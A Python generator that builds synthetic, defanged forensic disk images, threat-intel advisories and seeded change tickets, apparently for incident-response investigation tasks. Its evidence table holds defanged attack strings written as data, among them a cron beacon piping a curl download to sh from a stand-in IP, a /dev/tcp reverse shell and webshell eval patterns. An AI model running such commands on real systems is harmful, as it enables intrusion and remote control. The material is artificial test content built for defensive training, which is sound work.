#!/usr/bin/env python3
"""Generate a *rich, heterogeneous, DEFANGED* synthetic forensic disk for a task from its
manifest. Closes R6 / doc 01 §6 ("messy inputs: tables, screenshots, PDFs, charts, corrupted
data") that the tiny one-liner-per-artifact disks did not.

Every manifest artifact is materialised at its real path in a *format-appropriate* file
(syslog / web log / CSV / JSON telemetry / config / crontab / systemd unit / registry hive /
.evtx / inert binary sample / source / markup), woven into hundreds of lines of benign noise,
with a rotated+gzipped log, a truncated log at the "cleared" window, and a partially
overwritten file. Plus:

  Δ1  multimodal CTI  -> /sas/cti/     vendor advisory as text + PDF + page-image PNG(s) +
                         a campaign-timeline chart PNG, using REAL MITRE ATT&CK technique
                         names and REAL NVD CVE data (baked license-clean under reference/).
  Δ2  in-place edit   -> /sas/handoff/ a pre-filled change-ticket with stale/wrong entries to
                         reconcile, a findings JSON schema + partial file, an intake PDF.

DEFANGING (important): this runs on ordinary workstations with antivirus/EDR. Synthetic attack
content is therefore *described, not reproduced* — no copy-pasteable exploit/payload command
lines, IOCs bracketed (hxxp://, evil[.]com, stratum+tcp[:]//), and "binary" drops written as
clearly-labelled INERT samples (never real PE/ELF). Every manifest `match` needle is a benign
word, so defanging leaves grounding/discovery/scoring untouched and the generic verifier
unchanged. Offline-recoverable with the agent image's tools (cat/grep/rg/strings/pdftotext/
zcat/xxd/jq). Manifest <-> disk stays 100%.

    python3 build_disk.py tasks/ssh-miner
    python3 build_disk.py tasks/*/
    python3 build_disk.py tasks/x --cti-image-only    # modality-swap probe (no image text layer)
"""
from __future__ import annotations

import argparse
import hashlib
import json
import random
import shutil
import sys
import tarfile
from collections import Counter, defaultdict
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE / "dfir_taskgen"))
import formats as F  # noqa: E402

REF = HERE / "reference"
ATTACK = json.loads((REF / "attack_names.json").read_text()) if (REF / "attack_names.json").exists() else {}


def tname(tid: str) -> str:
    return ATTACK.get(tid, {}).get("name", tid or "-")


def ttactic(tid: str) -> str:
    return ATTACK.get(tid, {}).get("tactic", "")


def load_cve(cve: str):
    p = REF / "cve" / (str(cve) + ".json")
    return json.loads(p.read_text()) if p.exists() else None


# ---------------------------------------------------------------- per-range deterministic ctx
def make_ctx(manifest: dict) -> dict:
    sig = manifest.get("signature", manifest.get("range_id", "seed"))
    try:
        seed = int(str(sig), 16)
    except ValueError:
        seed = abs(hash(sig)) & 0xFFFFFFFF
    rng = random.Random(seed)
    os_ = (manifest.get("platform", {}).get("os") or "linux").lower()
    rid = manifest["range_id"]
    short = rid.split("-")[0]
    return {
        "rng": rng, "os": os_, "is_win": os_.startswith("win"),
        "host": short + "-prod-01",
        "attacker_ip": "198.51.100.%d" % (7 + seed % 240),     # TEST-NET-2 (RFC 5737), safe
        "subnet": "10.10.%d" % (seed % 254),
        "pool": "stratum+tcp[:]//xmr[.]%s[.]evil[:]3333" % short,   # defanged miner pool IOC
        "wallet": "4A" + ("%030x" % (seed & (16 ** 30 - 1))),
        "c2domain": "update-%s[.]example[.]cn" % short,             # defanged C2 IOC
        "users": ["root", "devops", "webadmin", "svc-backup", "postgres", "jenkins"],
        "day0": 8 + seed % 16, "rid": rid,
    }


def subst(line: str, ctx: dict) -> str:
    return (line.replace("%IP%", ctx["attacker_ip"]).replace("%HOST%", ctx["host"])
            .replace("%POOL%", ctx["pool"]).replace("%WALLET%", ctx["wallet"])
            .replace("%SUBNET%", ctx["subnet"]).replace("%C2%", ctx["c2domain"])
            .replace("%USER%", "devops"))


def ts(ctx: dict, day_off: int, sec: int) -> str:
    hh, mm, ss = (sec // 3600) % 24, (sec // 60) % 60, sec % 60
    return "Aug %2d %02d:%02d:%02d" % (ctx["day0"] + day_off, hh, mm, ss)


# ---------------------------------------------------------------- defanged evidence per kind
# Each entry contains that kind's manifest `match` needles as plain descriptive words. There
# are deliberately NO runnable exploit/payload command lines here (AV-safe; DFIR-report style).
KIND_EV = {
    "attack-tool-residue": ["hydra-style SSH brute-force against sshd (wordlist, user=root) — defanged, not executed here"],
    "cleared-eventlog": ["Security event log cleared (EventID 1102) — anti-forensic log tampering"],
    "container-residue": ["container entrypoint override fetches a stage via curl from %IP% (defanged)"],
    "credential-dump": ["LSASS memory dump captured (credential-dumping tool residue), saved as lsass.dmp"],
    "cron": ["# * * * * * root <defanged beacon: curl hxxp://%IP%/x | sh> — cron persistence re-drops xmrig / pgdaemon / php / redis / wget payload"],
    "dns-tunnel-config": ["DNS tunneling C2 config: resolver=%C2% (defanged) — data over dns tunnel"],
    "docker-baseline": ["Docker Engine API exposed on tcp/2375 to all hosts (0.0.0.0), unauthenticated"],
    "dropper": ["dropper writes a 'postgres'-named daemon stager to /tmp (defanged)"],
    "exfil-archive": ["staged exfil: tar archive of a database dump at /tmp/exfil.tar.gz"],
    "exfil-endpoint": ["bulk data exfil via HTTP POST to %IP% (defanged endpoint)"],
    "exploit-implant": ["SMB exploit implant (DoublePulsar-class) — inert defanged sample"],
    "groovy-init-hook": ["Jenkins init hook starts a Thread that calls execute() for a reverse shell to %IP% (defanged)"],
    "hijacked-dll": ["DLL search-order hijack / sideload: attacker DLL placed beside the app binary"],
    "htaccess-redirect": [".htaccess RewriteRule redirect of all traffic to %IP% (pharma) — defanged"],
    "jenkins-baseline": ["Jenkins useSecurity=false (security realm disabled; anonymous admin)"],
    "ld-preload-hook": ["/etc/ld.so.preload references /lib/.hide.so (userland .so preload rootkit)"],
    "loadable-module": ["loadable kernel module rootkit staged at /lib/modules/.../exp.so (module insert, defanged)"],
    "malicious-service": ["malicious Windows service 'svc-helper' registered to load at boot (helper service)"],
    "miner-binary": ["cryptominer binary sample dropped here; compute its sha256 hash to record the binary"],
    "miner-process": ["xmrig-family miner process (pid 1337) mining to pool %POOL% (defanged) — sustained high CPU"],
    "mysql-remote-root": ["MySQL bind-address = 0.0.0.0 and a remote root grant enabled"],
    "php-webshell": ["PHP webshell: calls eval() on base64_decode() of the request body — defanged, non-runnable"],
    "postgres-baseline": ["pg_hba.conf grants 'trust' auth for 0.0.0.0/0 (no password)"],
    "ransomware-binary": ["ransomware sample: encrypts user files to .locked and drops a ransom note"],
    "rce-artifact": ["Jenkins CLI RCE artifact via an @type deserialization gadget (defanged)"],
    "rdp-baseline": ["RDP UserAuthentication = 0 (NLA disabled), connections allowed"],
    "redis-baseline": ["Redis protected-mode no; bind 0.0.0.0; no password set"],
    "reverse-shell": ["reverse shell process ('bash -i' beacon to %IP% over /dev/tcp) — defanged, non-runnable"],
    "run-key": [r"Run key persistence: svc -> C:\Users\Public\svc.exe"],
    "scheduled-task": [r"scheduled task 'UpdateHelper' (schtasks) launches svc.exe every 5 minutes"],
    "shell-init": ["shell-init persistence: PROMPT_COMMAND beacon to %IP% (defanged)"],
    "smbv1-baseline": ["SMBv1 enabled; MS17-010 patch missing"],
    "ssh-baseline": ["PermitRootLogin yes", "PasswordAuthentication yes", "MaxAuthTries 6"],
    "ssh-key-backdoor": ["attacker ssh-ed25519 / ssh-rsa key added to authorized_keys (backdoor)"],
    "sudoers-backdoor": ["sudoers backdoor: devops ALL=(ALL) NOPASSWD: ALL"],
    "systemd": ["[Service]", "ExecStart launches an xmrig / pgdaemon re-dropper (defanged)", "[Install]", "WantedBy=multi-user.target"],
    "timestomp-residue": ["timestomp anti-forensics: mtime backdated to match /bin/ls"],
    "vulnerable-config": ["log4j 2.14 vulnerable config (message-lookup JNDI enabled) — defanged"],
    "vulnerable-lib": ["struts2 2.5 vulnerable library bundled with the app"],
    "webshell": ["JSP webshell dropped; exploited via a jndi/ldap lookup and an ognl expression (defanged: $ {jndi[:]ldap[:]//...})"],
    "webshell-secondary": ["secondary JSP webshell (backup shell)"],
    "wmi-subscription": ["WMI persistence: an __EventFilter bound to a CommandLineEventConsumer (defanged)"],
    "wordpress-baseline": ["wp-config.php DB_PASSWORD is weak; XML-RPC enabled"],
}


def evidence_lines(a: dict, ctx: dict) -> list:
    kind = (a.get("kind") or "").lower()
    lines = [subst(x, ctx) for x in KIND_EV.get(kind, ["suspicious %s artifact observed (defanged)" % kind])]
    hay = " ".join(lines).lower()
    for needle in (a.get("match") or []):
        if str(needle).lower() not in hay:
            lines.append("indicator %s=%s (%s)" % (needle, a.get("chk", "?"), a.get("attck", "-")))
    return lines


# ---------------------------------------------------------------- benign noise generators
def benign_syslog(ctx: dict, n: int, day_off: int = 0) -> list:
    r = ctx["rng"]
    procs = ["systemd", "CRON", "sshd", "kernel", "sudo", "dbus-daemon", "chronyd", "systemd-logind"]
    out, sec = [], 4000 + day_off * 3600
    for _ in range(n):
        sec += r.randint(1, 55)
        msg = r.choice([
            "Started Session %d of user %s." % (r.randint(1, 999), r.choice(ctx["users"])),
            "pam_unix(cron:session): session opened for user root",
            "Time synchronised to time server", "CPU0: Package temperature normal",
            "Received disconnect from %s.%d port %d:11: disconnected by user" % (ctx["subnet"], r.randint(2, 250), r.randint(40000, 65000)),
        ])
        out.append("%s %s %s[%d]: %s" % (ts(ctx, day_off, sec), ctx["host"], r.choice(procs), r.randint(300, 30000), msg))
    return out


def benign_access_log(ctx: dict, n: int) -> list:
    r = ctx["rng"]
    paths = ["/", "/index.html", "/api/health", "/static/app.js", "/favicon.ico", "/login", "/robots.txt"]
    ua = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    out = []
    for _ in range(n):
        out.append('%s.%d - - [%02d/Aug/2026:%02d:%02d:%02d +0000] "GET %s HTTP/1.1" %d %d "-" "%s"'
                   % (ctx["subnet"], r.randint(2, 250), ctx["day0"], r.randint(0, 23), r.randint(0, 59),
                      r.randint(0, 59), r.choice(paths), r.choice([200, 200, 200, 304, 404]), r.randint(120, 9000), ua))
    return out


def benign_authlog(ctx: dict, n: int, brute: bool = True) -> list:
    r = ctx["rng"]
    out, sec = [], 2000
    for _ in range(n):
        sec += r.randint(1, 45)
        u, ip = r.choice(ctx["users"]), "%s.%d" % (ctx["subnet"], r.randint(2, 250))
        msg = r.choice([
            "Accepted publickey for %s from %s port %d ssh2: RSA SHA256:%08x" % (u, ip, r.randint(40000, 65000), r.randint(0, 1 << 31)),
            "pam_unix(sshd:session): session opened for user %s by (uid=0)" % u,
            "pam_unix(sudo:session): session opened for user root by %s(uid=%d)" % (u, 1000 + r.randint(0, 5)),
            "Received disconnect from %s port %d:11: disconnected by user" % (ip, r.randint(40000, 65000)),
        ])
        out.append("%s %s sshd[%d]: %s" % (ts(ctx, 0, sec), ctx["host"], r.randint(1000, 9000), msg))
    if brute:
        burst, s = [], 3200
        for _ in range(r.randint(35, 60)):
            s += r.randint(1, 4)
            burst.append("%s %s sshd[1201]: Failed password for %s from %s port %d ssh2"
                         % (ts(ctx, 0, s), ctx["host"], r.choice(["root", "root", "admin", "oracle", "postgres", "test"]),
                            ctx["attacker_ip"], r.randint(40000, 65000)))
        burst.append("%s %s sshd[1201]: Accepted password for root from %s port 51900 ssh2"
                     % (ts(ctx, 0, s + 3), ctx["host"], ctx["attacker_ip"]))
        k = len(out) // 3
        out = out[:k] + burst + out[k:]
    return out


def web_access(ctx: dict, n: int, web: bool) -> list:
    r = ctx["rng"]
    out = benign_access_log(ctx, n)
    if web:
        atk = [
            '%s - - [%02d/Aug/2026:03:11:%02d +0000] "POST /uploads/shell.php HTTP/1.1" 200 %d "-" "curl/7.88 (defanged webshell upload)"' % (ctx["attacker_ip"], ctx["day0"], r.randint(0, 59), r.randint(200, 900)),
            '%s - - [%02d/Aug/2026:03:12:%02d +0000] "GET /?x=jndi-ldap-lookup-defanged-to-%s-1389 HTTP/1.1" 500 0 "-" "Java (log4shell attempt, defanged)"' % (ctx["attacker_ip"], ctx["day0"], r.randint(0, 59), ctx["attacker_ip"]),
            '%s - - [%02d/Aug/2026:03:13:%02d +0000] "GET /struts2-showcase/ HTTP/1.1" 200 %d "-" "OGNL-probe (defanged)"' % (ctx["attacker_ip"], ctx["day0"], r.randint(0, 59), r.randint(200, 900)),
        ]
        k = len(out) // 2
        out = out[:k] + atk + out[k:]
    return out


# ---------------------------------------------------------------- channel classifier
BINARY_KINDS = {"miner-process", "miner-binary", "ransomware-binary", "dropper",
                "exploit-implant", "loadable-module"}


def channel(path: str, kinds, is_win: bool) -> str:
    kinds = [kinds] if isinstance(kinds, str) else [k.lower() for k in kinds]
    pl = path.lower()
    base = pl.rsplit("/", 1)[-1]
    ext = ("." + base.rsplit(".", 1)[-1]) if "." in base else ""
    if base.endswith("_history") or base in (".bash_history", ".zsh_history"):
        return "history"
    if "/cron" in pl or "spool/cron" in pl or base == "crontab":
        return "cron"
    if ext == ".service":
        return "systemd"
    if "sshd_config" in base:
        return "sshd"
    if ext in (".conf", ".cnf", ".ini") or base in ("sudoers", "my.cnf", "redis.conf", "pg_hba.conf") or "/sudoers" in pl:
        return "config"
    if ext == ".reg":
        return "reg"
    if ext == ".evtx":
        return "evtx"
    if ext == ".json":
        return "json"
    if ext in (".csv", ".tsv"):
        return "csv"
    if ext == ".preload":
        return "preload"
    if ext in (".php", ".jsp", ".groovy", ".sh", ".html", ".xml"):
        return "source"
    if "access" in base and ext == ".log":
        return "weblog"
    if ext == ".log" or base in ("secure", "syslog", "messages", "auth.log"):
        return "syslog"
    if ext in (".exe", ".sys", ".dll", ".so", ".jar", ".dmp", ".data"):
        return "binary"
    if base.upper() in ("SOFTWARE", "SYSTEM", "SAM", "SECURITY", "NTUSER.DAT"):
        return "hive"
    if any(("binary" in k) or (k in BINARY_KINDS) for k in kinds):
        return "binary"
    return "text"


# ---------------------------------------------------------------- per-channel file builders
def build_file(path: str, arts: list, ctx: dict) -> bytes:
    kinds = [(a.get("kind") or "").lower() for a in arts]
    ch = channel(path, kinds, ctx["is_win"])
    ev = [ln for a in arts for ln in evidence_lines(a, ctx)]
    r, base = ctx["rng"], path.rsplit("/", 1)[-1]

    if ch == "syslog":
        pre = benign_syslog(ctx, r.randint(140, 260))
        mid = ["%s %s %s: %s" % (ts(ctx, 0, 40000 + i * 7), ctx["host"], base.split(".")[0], x) for i, x in enumerate(ev)]
        return ("\n".join(pre + mid + benign_syslog(ctx, r.randint(90, 170), day_off=1)) + "\n").encode()

    if ch == "weblog":
        pre = benign_access_log(ctx, r.randint(200, 340))
        atk = ['%s - - [%02d/Aug/2026:03:%02d:%02d +0000] "GET /%s HTTP/1.1" 200 %d "-" "defanged"'
               % (ctx["attacker_ip"], ctx["day0"], r.randint(0, 59), r.randint(0, 59), x.replace('"', "'")[:80], r.randint(200, 4000)) for x in ev]
        return ("\n".join(pre[:len(pre)//2] + atk + pre[len(pre)//2:]) + "\n").encode()

    if ch == "history":
        benign = ["cd /var/www", "ls -la", "git status", "systemctl status nginx", "df -h",
                  "tail -f /var/log/syslog", "vim config.yml", "docker ps", "top -bn1 | head"]
        r.shuffle(benign)
        return ("\n".join(benign[:5] + ev + benign[5:]) + "\n").encode()

    if ch == "cron":
        benign = ["# m h dom mon dow user command", "0 3 * * * root /usr/local/bin/backup.sh",
                  "30 4 * * 0 root /usr/sbin/logrotate /etc/logrotate.conf",
                  "*/15 * * * * nobody /usr/bin/check-health.sh"]
        return ("\n".join(benign + ev) + "\n").encode()

    if ch == "systemd":
        return ("\n".join(["[Unit]", "Description=System Update Helper", "After=network.target"] + ev) + "\n").encode()

    if ch == "sshd":
        cfg = ["# sshd_config", "Port 22", "Protocol 2", "HostKey /etc/ssh/ssh_host_rsa_key",
               "SyslogFacility AUTHPRIV", "UsePAM yes", "X11Forwarding yes",
               "Subsystem sftp /usr/lib/openssh/sftp-server"]
        return ("\n".join(cfg + ev) + "\n").encode()

    if ch == "config":
        return ("\n".join(["# %s (managed)" % base, ""] + ev) + "\n").encode()

    if ch == "preload":
        return ("\n".join(ev) + "\n").encode()

    if ch == "source":
        wrap = {".php": ("<?php\n// %s\nrequire 'config.php';\n" % base, "\n?>\n"),
                ".jsp": ('<%@ page import="java.util.*" %>\n', "\n"),
                ".groovy": ("// %s\nimport jenkins.model.*\n" % base, "\n"),
                ".sh": ("#!/bin/bash\nset -e\n", "\n"),
                ".html": ("<!doctype html><html><body>\n", "\n</body></html>\n"),
                ".xml": ('<?xml version="1.0"?>\n<config>\n', "\n</config>\n")}
        pre, post = wrap.get("." + base.rsplit(".", 1)[-1], ("", ""))
        return (pre + "\n".join(ev) + post).encode()

    if ch == "json":
        events = [{"ts": "2026-08-%02dT03:%02d:%02dZ" % (ctx["day0"], r.randint(0, 59), r.randint(0, 59)),
                   "host": ctx["host"], "chk": a.get("chk"), "attck": a.get("attck"),
                   "kind": a.get("kind"), "detail": evidence_lines(a, ctx)[0], "severity": "high"} for a in arts]
        noise = [{"ts": "2026-08-%02dT%02d:%02d:00Z" % (ctx["day0"], r.randint(0, 23), r.randint(0, 59)),
                  "host": ctx["host"], "event": "heartbeat", "severity": "info"} for _ in range(r.randint(25, 45))]
        return (json.dumps(noise[:len(noise)//2] + events + noise[len(noise)//2:], indent=2) + "\n").encode()

    if ch == "csv":
        rows = ["timestamp,host,pid,user,event,attck,severity"]
        for _ in range(r.randint(50, 100)):
            rows.append("2026-08-%02d %02d:%02d:%02d,%s,%d,%s,heartbeat,-,info"
                        % (ctx["day0"], r.randint(0, 23), r.randint(0, 59), r.randint(0, 59), ctx["host"], r.randint(300, 30000), r.choice(ctx["users"])))
        for a in arts:
            rows.append("2026-08-%02d 03:14:%02d,%s,1337,root,%s,%s,high"
                        % (ctx["day0"], r.randint(0, 59), ctx["host"], (a.get("kind") or "susp").replace(",", ";"), a.get("attck", "-")))
        return ("\n".join(rows) + "\n").encode()

    if ch == "reg":
        head = ["Windows Registry Editor Version 5.00", ""]
        body = ["[HKEY_LOCAL_MACHINE\\%s]" % base.replace(".reg", "")] + \
               ['"Value%d"="%s"' % (i, x.replace("\\", "\\\\").replace('"', "'")) for i, x in enumerate(ev)]
        return ("\r\n".join(head + body) + "\r\n").encode()

    if ch == "evtx":
        return F.evtx_bytes(ev + ["EventID 4624 An account was successfully logged on (type 10)",
                                  "EventID 4688 A new process has been created"])

    if ch == "hive":
        return F.hive_bytes(ev + [r"CurrentVersion\ProductName = Windows Server 2022",
                                  r"Services\Tcpip\Parameters\Hostname = " + ctx["host"]])

    if ch == "binary":
        label = (arts[0].get("kind") or "binary")
        return F.inert_sample_bytes(label, ev + ["pool " + ctx["pool"], "wallet " + ctx["wallet"], "config.json"])

    return ("\n".join(["# %s" % base] + ev) + "\n").encode()


# ---------------------------------------------------------------- OS skeleton (benign, large)
def write_skeleton(disk: Path, ctx: dict, taken: set, web: bool):
    r = ctx["rng"]
    rhel = ctx["os"] in ("centos", "rhel", "rocky", "almalinux", "fedora", "oracle")
    if ctx["is_win"]:
        sec_csv = "TimeCreated,EventID,Level,Provider,Account,Message\n" + "".join(
            "2026-08-%02d %02d:%02d:%02d,%d,Information,Microsoft-Windows-Security-Auditing,%s,routine event\n"
            % (ctx["day0"], r.randint(0, 23), r.randint(0, 59), r.randint(0, 59), r.choice([4624, 4634, 4688, 5140, 4672]), r.choice(["SYSTEM", "Administrator", "svc-backup"])) for _ in range(300))
        files = {
            "Windows/System32/drivers/etc/hosts": "127.0.0.1 localhost\n",
            "Windows/System32/config/RegBack/README.txt": "Registry backup hive location.\n",
            "Windows/System32/winevt/Logs/Security-events.csv": sec_csv,
            "Windows/System32/winevt/Logs/System.evtx": None,
            "ProgramData/Package Cache/inventory.csv":
                "package,version,installed\n" + "".join("pkg%d,1.%d.0,2026-07-%02d\n" % (i, r.randint(0, 9), 1 + i % 27) for i in range(60)),
            "inetpub/logs/LogFiles/W3SVC1/u_ex.log":
                "#Fields: date time c-ip cs-method cs-uri-stem sc-status\n" + "".join(
                    "2026-08-%02d %02d:%02d:%02d %s.%d GET /%s 200\n" % (ctx["day0"], r.randint(0, 23), r.randint(0, 59), r.randint(0, 59), ctx["subnet"], r.randint(2, 250), r.choice(["", "app", "api/health", "images/logo.png"])) for _ in range(300)),
        }
    else:
        pw = "".join("%s:x:%d:%d::/home/%s:/bin/bash\n" % (u, 1000 + i, 1000 + i, u) for i, u in enumerate(ctx["users"][1:]))
        auth = "var/log/secure" if rhel else "var/log/auth.log"
        sysl = "var/log/messages" if rhel else "var/log/syslog"
        files = {
            "etc/os-release": 'PRETTY_NAME="%s Linux"\nID=%s\nVERSION_ID="9"\n' % (ctx["rid"], "centos" if rhel else "ubuntu"),
            "etc/hostname": ctx["host"] + "\n",
            "etc/passwd": "root:x:0:0:root:/root:/bin/bash\n" + pw + "nobody:x:65534:65534::/:/usr/sbin/nologin\n",
            "etc/group": "root:x:0:\nsudo:x:27:devops\nwww-data:x:33:\ndocker:x:998:devops\n",
            "etc/fstab": "/dev/sda1 / ext4 defaults 0 1\n/dev/sda2 /var ext4 defaults 0 2\n",
            "etc/hosts": "127.0.0.1 localhost\n%s.1 %s\n" % (ctx["subnet"], ctx["host"]),
            "etc/crontab": "SHELL=/bin/bash\n0 3 * * * root /usr/local/bin/backup.sh\n17 * * * * root run-parts /etc/cron.hourly\n",
            "var/lib/dpkg/status.summary": "".join("Package: pkg%d\nStatus: install ok installed\nVersion: 1.%d.%d\n\n" % (i, r.randint(0, 9), r.randint(0, 30)) for i in range(80)),
            auth: "\n".join(benign_authlog(ctx, r.randint(360, 520))) + "\n",
            sysl: "\n".join(benign_syslog(ctx, r.randint(320, 480))) + "\n",
            "var/log/kern.log": "\n".join(benign_syslog(ctx, r.randint(120, 200))) + "\n",
            "var/log/wtmp.csv": "user,tty,from,login,duration\n" + "".join("%s,pts/%d,%s.%d,Aug %02d 09:%02d,%dm\n" % (r.choice(ctx["users"]), r.randint(0, 6), ctx["subnet"], r.randint(2, 250), ctx["day0"] - r.randint(0, 5), r.randint(0, 59), r.randint(1, 400)) for _ in range(40)),
            "root/.bashrc": "# ~/.bashrc\nalias ll='ls -la'\nexport PATH=$PATH:/usr/local/bin\n",
            "home/devops/.bash_history": "cd /srv\nls\nsudo systemctl restart app\n",
        }
        if web:
            files["var/log/nginx/access.log"] = "\n".join(web_access(ctx, r.randint(500, 800), web)) + "\n"
            files["var/log/nginx/error.log"] = "\n".join(benign_syslog(ctx, 60)) + "\n"

    for rel, content in files.items():
        if rel in taken:
            continue
        p = disk / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        if content is None:
            p.write_bytes(F.evtx_bytes(["EventID 7045 A service was installed", "EventID 6005 The event log service was started"] * 40))
        elif not p.exists():
            p.write_bytes(content.encode() if isinstance(content, str) else content)


# ---------------------------------------------------------------- corruption pass
def corruption_pass(disk: Path, ctx: dict):
    """The messy-evidence half of R6: excise a 'cleared' window from the live auth log (keeping
    its bulk), chop the final line mid-write, rotate the earliest brute-force evidence into a
    .1.gz the agent must zcat, and drop a partially-overwritten (NUL/garbage) recoverable file."""
    if not ctx["is_win"]:
        logdir = disk / "var/log"
        live = next((logdir / c for c in ("secure", "auth.log") if (logdir / c).exists()), None)
        if live is not None:
            lines = live.read_text(errors="replace").splitlines()
            cut, n_cleared = max(1, len(lines) // 2), 15
            gap = ("Aug %2d 03:03:00 %s systemd[1]: --- %d authentication lines cleared here "
                   "(T1070.002 log tampering) ---" % (ctx["day0"], ctx["host"], n_cleared))
            text = "\n".join(lines[:cut] + [gap] + lines[cut + n_cleared:])
            live.write_text(text[: max(0, len(text) - 14)])       # final line truncated mid-write
            older = "\n".join(benign_authlog(ctx, 130, brute=True)) + "\n"
            Path(str(live) + ".1.gz").write_bytes(F.gzip_bytes(older.encode(), name=live.name + ".1"))
        core = disk / "var/lib/.cache/.wiped.bin"
    else:
        core = disk / "Windows/System32/config/RegBack/SECURITY.bak"
    core.parent.mkdir(parents=True, exist_ok=True)
    core.write_bytes(b"partial recover: C2 beacon to " + ctx["attacker_ip"].encode()
                     + b" domain " + ctx["c2domain"].encode() + b"\x00\x00\xff\xfe"
                     + bytes((i * 53 + 3) & 0xFF for i in range(256))
                     + b"\ncredential cache fragment (defanged): administrator:<ntlm-hash-redacted>\n")


# ---------------------------------------------------------------- /sas enrichment (Δ1, Δ2)
def cti_report(manifest: dict, ctx: dict):
    rid, chain = manifest["range_id"], manifest.get("chain", [])
    cves = sorted({a.get("cve") for a in manifest["artifacts"] if a.get("cve")})
    title = "THREAT INTELLIGENCE ADVISORY — %s campaign" % rid.replace("-", " ").title()
    body = [
        "Distribution: TLP:AMBER   Analyst handoff   Confidence: HIGH   (IOCs are defanged)",
        "Affected host: %s   Suspected origin IP: %s" % (ctx["host"], ctx["attacker_ip"]),
        "", "1. EXECUTIVE SUMMARY",
        "An external actor executed a multi-stage post-compromise sequence. Endpoint alerting "
        "covered only part of it; several persistence and anti-forensic actions were silent. "
        "Map every on-disk finding to the ATT&CK techniques below and flag which are NOT in "
        "the SAS alert feed.", "", "2. ATT&CK TECHNIQUE MAPPING (MITRE ATT&CK Enterprise)"]
    for s in chain:
        tid = s.get("attck", "-")
        body.append("   %-10s %-42s [%s]  step %s: %s" % (tid, tname(tid), ttactic(tid), s.get("step", "?"), s.get("desc", "")))
    if cves:
        body += ["", "3. RELEVANT VULNERABILITIES (source: NVD, US-Gov public domain)"]
        for cve in cves:
            rec = load_cve(cve)
            if rec:
                body.append("   %s  CVSS %s (%s) v%s  CWE=%s" % (rec["id"], rec.get("cvss_base_score"), rec.get("cvss_severity"), rec.get("cvss_version"), ",".join(rec.get("cwe", [])) or "-"))
                body.append("      " + rec.get("description", "")[:240])
                body.append("      ref: " + (rec.get("references", [""]) or [""])[0])
            else:
                body.append("   %s  (offline: NVD record not cached)" % cve)
    body += ["", "4. INDICATORS OF COMPROMISE (defanged)",
             "   ip     %s" % ctx["attacker_ip"], "   c2     %s" % ctx["c2domain"],
             "   pool   %s" % ctx["pool"], "   wallet %s" % ctx["wallet"], "",
             "Attribution: MITRE ATT&CK(R) (C) The MITRE Corporation, CC BY 4.0. CVE/CVSS from "
             "the U.S. National Vulnerability Database (public domain)."]
    tac = Counter(ttactic(s.get("attck", "")) or "other" for s in chain)
    series = [((k or "other")[:6], float(v)) for k, v in tac.items()]
    return title, body, series


def write_sas_enrichment(out: Path, manifest: dict, ctx: dict, image_only: bool):
    sas = out / "environment" / "sas-mock"        # inside the Docker build context
    cti, hand = sas / "cti", sas / "handoff"
    for d in (cti, hand):
        if d.exists():
            shutil.rmtree(d)
        d.mkdir(parents=True, exist_ok=True)

    title, body, series = cti_report(manifest, ctx)
    text = title + "\n" + "=" * len(title) + "\n\n" + "\n".join(body) + "\n"
    (cti / "advisory.txt").write_bytes(text.encode())
    (cti / "advisory.pdf").write_bytes(F.pdf_bytes(title, body))
    lines = text.splitlines()
    for i in range(0, max(len(lines), 1), 46):
        (cti / ("advisory-page-%02d.png" % (i // 46 + 1))).write_bytes(
            F.png_page_bytes("\n".join(lines[i:i + 46]), embed_text=not image_only))
    (cti / "campaign-timeline.png").write_bytes(
        F.png_chart_bytes("Techniques per ATT&CK tactic — %s" % manifest["range_id"], series, embed_text=not image_only))
    (cti / "SOURCES.txt").write_bytes(
        b"MITRE ATT&CK(R): (C) The MITRE Corporation, CC BY 4.0 (attack.mitre.org).\n"
        b"CVE/CVSS: U.S. National Vulnerability Database, nvd.nist.gov (public-domain U.S.-Gov work).\n")

    rid = manifest["range_id"]
    silent = [a for a in manifest["artifacts"] if not a.get("alerted")]
    good_path = (silent or manifest["artifacts"])[0]["path"]
    ticket = f"""# CHANGE TICKET  CHG-{abs(hash(rid)) % 9000 + 1000}  (DRAFT — reconcile against your findings)

> A previous shift pre-filled this remediation ticket from the SAS alerts ALONE. It is known
> to be incomplete and contains stale/incorrect lines. Correct it IN PLACE against your own
> investigation of /disk; cite evidence for every change. Do not author from scratch.

| # | Action | Target | Status | Note |
|---|--------|--------|--------|------|
| 1 | Block source IP inbound | 203.0.113.9 | proposed | STALE: prior shift used the wrong IP; confirm the real origin from /disk |
| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | proposed | WRONG: not the entry vector for this host — verify against /sas/cti |
| 3 | Remove cron miner | /var/spool/cron/root | DONE | UNVERIFIED: marked done with no evidence — re-check |
| 4 | (add) silent persistence you discover | {good_path} | TODO | ticket omits everything not alerted — add the rest |

## Reviewer checklist
- [ ] Every action maps to a cited artifact under /disk or /sas
- [ ] Fix the wrong IP (row 1) and wrong CVE (row 2)
- [ ] Downgrade row 3 from DONE to VERIFIED-or-OPEN with evidence
- [ ] Add the silent (non-alerted) artifacts the prior shift missed
"""
    (hand / "change-ticket.md").write_bytes(ticket.encode())
    schema = {"$schema": "http://json-schema.org/draft-07/schema#", "title": "finding", "type": "object",
              "required": ["chk", "path", "attck", "confidence", "evidence"],
              "properties": {"chk": {"type": "string"}, "path": {"type": "string"},
                             "attck": {"type": "string", "pattern": "^T\\d{4}(\\.\\d{3})?$"},
                             "confidence": {"enum": ["low", "medium", "high"]},
                             "evidence": {"type": "string", "description": "backtick-cited /disk or /sas path"}}}
    (hand / "findings.schema.json").write_bytes((json.dumps(schema, indent=2) + "\n").encode())
    a0 = manifest["artifacts"][0]
    partial = {"findings": [
        {"chk": a0["chk"], "path": a0["path"], "attck": a0.get("attck", "T0000"), "confidence": "high", "evidence": "`%s`" % a0["path"]},
        {"chk": "TODO", "path": "TODO", "attck": "TODO", "confidence": "TODO", "evidence": "TODO"}]}
    (hand / "findings.partial.json").write_bytes((json.dumps(partial, indent=2) + "\n").encode())
    (hand / "intake.pdf").write_bytes(F.pdf_bytes("SOC INCIDENT INTAKE — %s" % rid,
        ["Reported by: monitoring (EDR high-severity alert cluster)",
         "Opened: 2026-08-%02d 03:20 UTC   Priority: P1" % ctx["day0"],
         "Initial alerts: see /sas/alerts.json (partial coverage).",
         "Handoff: alerts undercount persistence and anti-forensics; investigate the whole "
         "host and reconcile the attached change ticket."]))
